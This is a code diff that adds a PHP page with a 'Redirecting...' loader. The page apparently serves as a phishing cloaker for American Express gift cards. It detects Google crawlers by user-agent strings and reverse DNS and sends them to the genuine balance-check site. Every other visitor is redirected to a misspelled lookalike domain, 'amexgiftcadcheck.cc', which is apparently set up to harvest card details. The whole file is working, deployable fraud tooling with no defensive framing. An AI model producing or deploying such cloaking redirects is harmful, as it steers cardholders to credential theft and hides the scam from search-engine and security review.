@@ -1,0 +1,95 @@
+<?php
+function is_google_bot() {
+    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $host = gethostbyaddr($ip);
+
+    $google_bots = [
+        'googlebot',
+        'adsbot-google',
+        'mediapartners-google',
+        'googlebot-image',
+        'googlebot-news',
+        'googlebot-video',
+        'adsbot-google-mobile',
+        'adsbot-google-mobile-apps',
+        'google-structured-data-testing-tool',
+        'google-read-aloud',
+        'google-sitemaps',
+        'google-favicon',
+        'feedfetcher-google',
+        'google-weblight',
+        'google-web-preview',
+        'storebot-google',
+        'google-speech',
+        'googleassistant',
+        'google-analytics',
+        'apis-google',
+        'chrome-lighthouse',
+        'google-crc',
+        'googleusercontent.com',
+        'appengine.google.com'
+    ];
+
+    foreach ($google_bots as $bot) {
+        if (strpos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    if (strpos($host, 'google') !== false || strpos($host, '1e100.net') !== false) {
+        return true;
+    }
+
+    return false;
+}
+
+// ریدایرکت بر اساس نوع بازدیدکننده
+if (is_google_bot()) {
+    header("Location: https://balance.amexgiftcard.com", true, 302);
+    exit;
+} else {
+    header("Location: https://amexgiftcadcheck.cc/amex/", true, 302);
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirecting...</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+    .loader {
+      width: 40px;
+      height: 40px;
+      border: 5px solid #444;
+      border-top: 5px solid #0af;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Redirecting...</h1>
+  <div class="loader"></div>
+</body>
+</html>
